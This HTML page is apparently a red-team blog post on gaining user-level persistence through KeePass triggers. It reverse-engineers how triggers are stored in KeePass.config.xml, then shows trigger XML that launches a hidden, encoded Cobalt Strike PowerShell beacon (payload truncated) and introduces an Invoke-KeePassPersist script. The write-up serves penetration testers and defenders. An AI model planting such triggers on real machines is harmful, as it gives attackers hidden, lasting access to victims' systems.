@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- layout.ejs-->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="two06">
+    <meta name="keyword" content="">
+    <link rel="canonical" href="https://blog.two06.info/two06.github.io/Persistence-with-KeePass-Part-2/">
+    <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-person-128.png">
+    <link rel="alternate" type="application/atom+xml" title="Another Infosec Blog" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/themes/smoothness/jquery-ui.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js"></script>
+
+    <title>
+        
+        Persistence with KeePass - Part 2｜two06 Infosec Blog
+        
+    </title>
+
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+    
+<link rel="stylesheet" href="/two06.github.io/css/main.css">
+
+
+    
+      <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+      
+<link rel="stylesheet" href="/two06.github.io/css/highlight.css">
+
+    
+
+    
+
+
+    
+
+    
+
+    
+
+
+    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    
+
+
+
+
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+
+    <!-- user customization -->
+    
+<link rel="stylesheet" href="/two06.github.io/css/arsnippet.css">
+
+    
+<script src="/two06.github.io/js/arsnippet.css.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<style>
+    header.intro-header {
+        background-image: url('')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<header>
+  <nav class="navbar navbar-default header-navbar" id="nav-top" data-ispost = "true" data-istags="false" data-ishome = "false" >
+    <div class="container-fluid">
+      <div class="navbar-header page-scroll">
+        <button type="button" class="navbar-toggle" data-toggle="collapse" aria-expanded="false"  data-target="#website_navbar">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <span class="navbar-brand animated pulse">
+          <a class="brand-logo" href="/two06.github.io/">
+            Another Infosec Blog
+          </a>
+        </span>
+      </div>
+
+      <div class="collapse navbar-collapse" id="website_navbar">
+          <ul class="nav navbar-nav navbar-right">
+              
+                <li>
+                  <a href="/two06.github.io/">home</a>
+                </li>
+              
+                <li>
+                  <a href="/two06.github.io/Other-Research/">Other Research</a>
+                </li>
+              
+                <li>
+                  <a href="/two06.github.io/archives/">archives</a>
+                </li>
+              
+                <li>
+                  <a href="/two06.github.io/atom.xml">RSS</a>
+                </li>
+              
+          </ul>
+      </div>
+  </nav>
+
+
+  
+    <style>
+       .intro-header {
+          background-image: url('');
+      }
+    </style>
+
+    <div class="intro-header">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                    <div class="site-heading">
+                        <h1>Persistence with KeePass - Part 2</h1>
+                        
+                        
+                          <span class="meta">
+                               <span class="meta-item">Author: two06</span>
+                               <span class="meta-item">Date: Jul 3, 2019</span>
+                               
+                          </span>
+                          <!--<div class="tags text-center">
+                              Categories: 
+                          </div>-->
+                          <div class="tags text-center">
+                              Tags: 
+                              <a class="tag" href="/two06.github.io/tags/#Infosec"
+                                 title="Infosec">Infosec</a>
+                              
+                              <a class="tag" href="/two06.github.io/tags/#Cobalt Strike"
+                                 title="Cobalt Strike">Cobalt Strike</a>
+                              
+                              <a class="tag" href="/two06.github.io/tags/#Programming"
+                                 title="Programming">Programming</a>
+                              
+                              <a class="tag" href="/two06.github.io/tags/#Powershell"
+                                 title="Powershell">Powershell</a>
+                              
+                              <a class="tag" href="/two06.github.io/tags/#Dotnet"
+                                 title="Dotnet">Dotnet</a>
+                              
+                          </div>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+  
+</header>
+
+
+<!-- Main Content -->
+<!-- post.ejs -->
+<article>
+    <div class="container">
+      <div class="col-lg-8 col-lg-offset-1 col-sm-9">
+          
+          
+          <p>In <a href="https://blog.two06.info/Stealing-KeePass-Credentials-With-Frida/">part 1</a> we saw how we can use KeePass to gain persistent access to a compromised system. The technique shown in part 1 required (in most cases) local admin access. In this post, we are going to look at another method for gaining persistence, which requires only user level access.</p>
+<p>Before we get started, shout out to <a href="https://twitter.com/christophetd" target="_blank" rel="noopener">Christophe</a> for pointing me towards triggers as a possible persistence method.<br>If you want to follow along, you will need the KeePass source code, which can be downloaded from <a href="https://keepass.info/download.html" target="_blank" rel="noopener">here</a>. You’ll also need KeePass installed, on two VMs if you want to follow all the post, but one will suffice.</p>
+<p>KeePass supports <a href="https://keepass.info/help/v2/triggers.html" target="_blank" rel="noopener">triggers</a>, which are designed to allow automation of common tasks. Unlike plugins, triggers are defined within the KeePass UI; There’s no option for users to just drop a file to disk and have it automatically recognized. Allowing users to define triggers suggests that the trigger config is likely stored in a file somewhere. Lets try and figure out where and how these are stored.</p>
+<p>In Visual Studio, searching the solution explorer for “triggers” points us towards “EcasTriggersForm.cs”, which looks to be the form used to begin defining new triggers.</p>
+<p><img src="search.png" alt=""></p>
+<p>Viewing the code behind the “Add” button leads us to the EcasTrigger class.</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnBtnAdd</span>(<span class="params"><span class="keyword">object</span> sender, EventArgs e</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EcasTrigger tNew = <span class="keyword">new</span> EcasTrigger(<span class="literal">true</span>);</span><br><span class="line">    EcasTriggerForm f = <span class="keyword">new</span> EcasTriggerForm();</span><br><span class="line">    f.InitEx(tNew, <span class="literal">false</span>, m_ilIcons);</span><br><span class="line">    <span class="keyword">if</span>(UIUtil.ShowDialogAndDestroy(f) == DialogResult.OK)</span><br><span class="line">    &#123;</span><br><span class="line">        m_triggers.TriggerCollection.Add(tNew);</span><br><span class="line">        UpdateTriggerListEx(<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>The code within EcasTrigger.cs contains references to XML and serialization, so we can make an educated guess and assume the config is likely stored in XML somewhere on disk.</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">XmlArray(<span class="meta-string">"Conditions"</span>)</span>]</span><br><span class="line">[<span class="meta">XmlArrayItem(<span class="meta-string">"Condition"</span>)</span>]</span><br><span class="line"><span class="keyword">public</span> EcasCondition[] ConditionsArrayForSerialization</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">get</span> &#123; <span class="keyword">return</span> m_conds.CloneShallowToList().ToArray(); &#125;</span><br><span class="line">    <span class="keyword">set</span> &#123; m_conds = PwObjectList&lt;EcasCondition&gt;.FromArray(<span class="keyword">value</span>); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Looking at the OnBtnAdd code above, we can see it instantiates an instance of the EcasTriggerForm. This is the form where we configure the trigger. This codes doesn’t make it obvious where the config is written to. Rather than blindly dig through the code, we can use ProcMon to identify which files the app is writing to.</p>
+<p>With ProcMon running, launch KeePass and configure a trigger, it doesn’t matter what options are selected. ProcMon will capture a lot of data, so we’ll need to add some filters. First, we only want data from KeePass, so we can set a process name filter. It’s also unlikely that the config is stored in the registry, so we can exclude any registry operations. We know the file we want will not be a .dll, so we can exclude any path ending in .dll. We can also make a few other assumptions, such as the path not being in the Windows or Program Files directories (as standard users have permissions to add triggers).</p>
+<p>With filters applied, you won’t see anything interesting. KeePass only saves the triggers config on exit. Close KeePass and you should see more events captured, including a number of entries for “KeePass.config.xml” in the users App Data folder.</p>
+<p><img src="procmon.png" alt=""></p>
+<p>Looking at that file, we can see the trigger defined in XML. My trigger was named test, and displayed a messagebox containing “test”.</p>
+<p><img src="configxml.png" alt=""></p>
+<p>Here’s the trigger being executed when KeePass loads:</p>
+<p><img src="trigger_exec_1.png" alt=""></p>
+<p>Now we know where trigger configurations are stored, lets look at how they are defined. We need to understand the Guid and TypeGuid values, as this will help us when we develop some tooling later. It’s likely that the TypeGuid values are static, as they define what type of action or trigger is in use. It’s also likely that the Guid value is random, but it’s easy enough to confirm this.</p>
+<p>Within the EicasTrigger class, there is a constructor which takes a bool as a parameter:</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">EcasTrigger</span>(<span class="params"><span class="keyword">bool</span> bCreateNewUuid</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(bCreateNewUuid) m_uuid = <span class="keyword">new</span> PwUuid(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>PwUuid(true) calls into CreateNew(), which generates a new GUID:</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">CreateNew</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Debug.Assert(m_pbUuid == <span class="literal">null</span>); <span class="comment">// Only call from constructor</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        m_pbUuid = Guid.NewGuid().ToByteArray();</span><br><span class="line">        <span class="keyword">if</span>((m_pbUuid == <span class="literal">null</span>) || (m_pbUuid.Length != (<span class="keyword">int</span>)UuidSize))</span><br><span class="line">        &#123;</span><br><span class="line">            Debug.Assert(<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidOperationException();</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// Zero is a reserved value -- do not generate Zero</span></span><br><span class="line">        <span class="keyword">if</span>(!Equals(PwUuid.Zero)) <span class="keyword">break</span>;</span><br><span class="line">        Debug.Assert(<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>EcasTrigger(true) is called when a new trigger is defined. I won’t post the code, but its easy enough to confirm by finding all references to that call.</p>
+<p>The TypeGuids are a little more tricky. After some digging, it turns out they are defined as byte arrays. For actions, you can find the definitions in EcasDefaultActionProvider.cs.</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">m_actions.Add(<span class="keyword">new</span> EcasActionType(<span class="keyword">new</span> PwUuid(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123;</span><br><span class="line"><span class="number">0xDA</span>, <span class="number">0xE5</span>, <span class="number">0xF8</span>, <span class="number">0x3B</span>, <span class="number">0x07</span>, <span class="number">0x30</span>, <span class="number">0x4C</span>, <span class="number">0x13</span>,</span><br><span class="line"><span class="number">0x9E</span>, <span class="number">0xEF</span>, <span class="number">0x2E</span>, <span class="number">0xBA</span>, <span class="number">0xCB</span>, <span class="number">0x6E</span>, <span class="number">0xE4</span>, <span class="number">0xC7</span> &#125;),</span><br><span class="line">KPRes.ExecuteCmdLineUrl, PwIcon.Console, <span class="keyword">new</span> EcasParameter[] &#123;</span><br><span class="line"><span class="keyword">new</span> EcasParameter(KPRes.FileOrUrl, EcasValueType.String, <span class="literal">null</span>),</span><br><span class="line"><span class="keyword">new</span> EcasParameter(KPRes.Arguments, EcasValueType.String, <span class="literal">null</span>),</span><br><span class="line"><span class="keyword">new</span> EcasParameter(KPRes.WaitForExit, EcasValueType.Bool, <span class="literal">null</span>),</span><br><span class="line"><span class="keyword">new</span> EcasParameter(KPRes.WindowStyle, EcasValueType.EnumStrings,</span><br><span class="line"><span class="keyword">new</span> EcasEnum(<span class="keyword">new</span> EcasEnumItem[] &#123;</span><br><span class="line"><span class="keyword">new</span> EcasEnumItem(IdWindowNormal, KPRes.Normal),</span><br><span class="line"><span class="keyword">new</span> EcasEnumItem(IdWindowHidden, KPRes.Hidden),</span><br><span class="line"><span class="keyword">new</span> EcasEnumItem(IdWindowMin, KPRes.Minimized),</span><br><span class="line"><span class="keyword">new</span> EcasEnumItem(IdWindowMax, KPRes.Maximized) &#125;)),</span><br><span class="line"><span class="keyword">new</span> EcasParameter(KPRes.Verb, EcasValueType.String, <span class="literal">null</span>) &#125;,</span><br><span class="line">ExecuteShellCmd));</span><br></pre></td></tr></table></figure>
+<p>The Guids in the config file are are byte arrays, which are base64 encoded before being written.</p>
+<p>Those of you following along will have noticed one of the available actions is “Execute Commandline / URL”. Digging into the EcasDefaultActionProviders class, we find the ExecuteShellAction() method. I won’t paste it here, as it’s quite big, but following the code we can see it passes arguments into Process.Start(). Lets create a trigger that pops calc.</p>
+<p><img src="trigger1.png" alt=""></p>
+<p>Re-running KeePass results in calc.exe spawning once we click past the master password prompt.</p>
+<p><img src="calc.png" alt=""></p>
+<p>Looking at the config file XML, we can see how this trigger is defined.</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Trigger</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">Guid</span>&gt;</span>N2//Lt8wc0em9wGoCduaUg==<span class="tag">&lt;/<span class="name">Guid</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">Name</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">Name</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">Events</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Event</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">TypeGuid</span>&gt;</span>2PMe6cxpSBuJxfzi6ktqlw==<span class="tag">&lt;/<span class="name">TypeGuid</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">Parameters</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Event</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">Events</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">Conditions</span> /&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">Actions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Action</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">TypeGuid</span>&gt;</span>2uX4OwcwTBOe7y66y27kxw==<span class="tag">&lt;/<span class="name">TypeGuid</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">Parameters</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Parameter</span>&gt;</span>cmd.exe<span class="tag">&lt;/<span class="name">Parameter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Parameter</span>&gt;</span>/c calc<span class="tag">&lt;/<span class="name">Parameter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Parameter</span>&gt;</span>False<span class="tag">&lt;/<span class="name">Parameter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Parameter</span>&gt;</span>0<span class="tag">&lt;/<span class="name">Parameter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Parameter</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">Parameters</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Action</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">Actions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Trigger</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>We now know that we can execute code via triggers, that users can define triggers without needing local admin rights, and the structure of the config file used. The last thing we need to confirm is that we can move this trigger to a new host and have it execute. On a new VM with KeePass installed, we can just paste the above XML into the config file and see what happens. I’m also going to try changing the command parameters, just to confirm there’s no validation baked into those GUIDs.</p>
+<p><img src="notepad.png" alt=""></p>
+<p>We can change the command and deploy the XML to a new host. The screenshot doesn’t really show it’s a new host — you’ll have to trust me (or try it yourself).</p>
+<p>One thing to note here is you MUST make sure KeePass is not running before you modify the config file, otherwise your changes will be overwritten when KeePass is closed (remember having to exit KeePass to see the write action in ProcMon?).</p>
+<p>Ok, let’s get a beacon running. We can generate a Powershell command from Cobalt Strike and drop that into our XML.</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Trigger</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">Guid</span>&gt;</span>N2//Lt8wc0em9wGoCduaUg==<span class="tag">&lt;/<span class="name">Guid</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">Name</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">Name</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">Events</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Event</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">TypeGuid</span>&gt;</span>2PMe6cxpSBuJxfzi6ktqlw==<span class="tag">&lt;/<span class="name">TypeGuid</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">Parameters</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Event</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">Events</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">Conditions</span> /&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">Actions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Action</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">TypeGuid</span>&gt;</span>2uX4OwcwTBOe7y66y27kxw==<span class="tag">&lt;/<span class="name">TypeGuid</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">Parameters</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Parameter</span>&gt;</span>cmd.exe<span class="tag">&lt;/<span class="name">Parameter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Parameter</span>&gt;</span>/c powershell -nop -w hidden -encodedcommand JABzAD0AT<span class="tag">&lt;<span class="name">snipped</span>&gt;</span><span class="tag">&lt;/<span class="name">Parameter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Parameter</span>&gt;</span>False<span class="tag">&lt;/<span class="name">Parameter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Parameter</span>&gt;</span>0<span class="tag">&lt;/<span class="name">Parameter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Parameter</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">Parameters</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Action</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">Actions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Trigger</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Now when we run KeePass we see the host beaconing back. If you’re wondering about AV, Defender is disabled in <a href="https://www.fireeye.com/blog/threat-research/2019/03/commando-vm-windows-offensive-distribution.html" target="_blank" rel="noopener">Commando VM</a>. You’ll have to build your own payload to bypass it ;)</p>
+<p><img src="beacon.png" alt=""></p>
+<p>We can take this one step further and create a Powershell script to modify the config file for us. This version is a little bit naive, as it assumes you will always pass the command to CMD.exe via the /c switch and assumes KeePass isn’t running; I’ll leave improving it as an exercise for the reader. I’ve changed the config slightly to use the “hidden” window mode. This stops the CMD.exe window being visible when our command is run.</p>
+<script src="https://gist.github.com/two06/15a0239595a943b22c3331f421950ca9.js"></script>
+
+<p>To use, import the module and call Invoke-KeePassPersist, passing the command and the module name. It will generate a new GUID and modify the config file in the current users AppData directory. It supports existing triggers, so it wont overwrite anything.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\KeePassPersist.ps1</span><br><span class="line"><span class="built_in">Invoke-KeePassPersist</span> <span class="literal">-Command</span> calc.exe <span class="literal">-Name</span> two06</span><br></pre></td></tr></table></figure>
+
+<p>We now have a method of gaining persistence via KeePass, without needing local admin privileges. We also have some tooling to allow us to easily use this method in our engagements.</p>
+<p>As a final note, I want to stress that this is not a vulnerability in KeePass. This method simply uses existing functionality to achieve our goals.</p>
+
+          
+          <hr>
+          <ul class="pager">
+              
+              <li class="previous">
+                  <a href="/two06.github.io/Building-Tooling-With-GitHub-Actions/" data-toggle="tooltip" data-placement="left"
+                     title="Building Tooling With GitHub Actions">&larr; Previous Post</a>
+              </li>
+              
+              
+              <li class="next">
+                  <a href="/two06.github.io/Persistence-with-KeePass-Part-1/" data-toggle="tooltip" data-placement="top"
+                     title="Persistence with KeePass - Part 1">Next Post&rarr;</a>
+              </li>
+              
+          </ul>
+        
+  <br>
+  
+
+  
+  </div>
+
+
+        
+
+      </div>
+  </div>
+</article>
+
+<!-- Footer -->
+<!-- footer.ejs -->
+<footer>
+    <div class="text-center">
+      <ul class="list-inline">
+          
+              <li>
+                  <a href="/two06.github.io/atom.xml" target="_blank">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+              </li>
+          
+          
+              <li>
+                  <a target="_blank" href="https://twitter.com/two06">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+              </li>
+          
+          
+
+          
+
+          
+
+          
+              <li>
+                  <a target="_blank"  href="https://github.com/two06">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+              </li>
+          
+
+          
+
+          
+
+      </ul>
+     <div class="text-muted copyright">
+            &copy;
+            
+            2019 - 2020
+            
+            
+              <i class="fa fa-user"></i>
+            
+            two06
+        <br>
+          
+              Powered by <a target="_blank" href="https://hexo.io">Hexo</a>
+          
+          
+          
+          
+      </div>
+    </div>
+</footer>
+
+<!-- Custom Theme JavaScript -->
+
+<script src="/two06.github.io/js/main.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+</body>
+
+</html>
